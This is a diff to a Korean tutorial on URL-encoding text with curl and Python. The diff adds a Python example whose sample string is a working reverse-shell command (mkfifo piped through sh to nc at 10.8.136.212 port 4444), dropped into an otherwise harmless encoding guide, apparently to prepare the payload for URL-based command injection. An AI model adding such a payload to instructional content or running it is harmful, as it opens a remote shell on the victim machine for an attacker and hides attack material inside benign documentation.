@@ -52,6 +52,14 @@ curl -s -o /dev/null -w "%{url_effective}" --get --data-urlencode "param=값 특
 
 ### 2. Python을 이용한 방법
 
+```python
+import urllib.parse
+
+text = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
+encoded = urllib.parse.quote(text)
+print(encoded)
+```
+
 ```bash
 # URL 인코딩
 python3 -c "import urllib.parse; print(urllib.parse.quote('값 특수문자!@#'))"
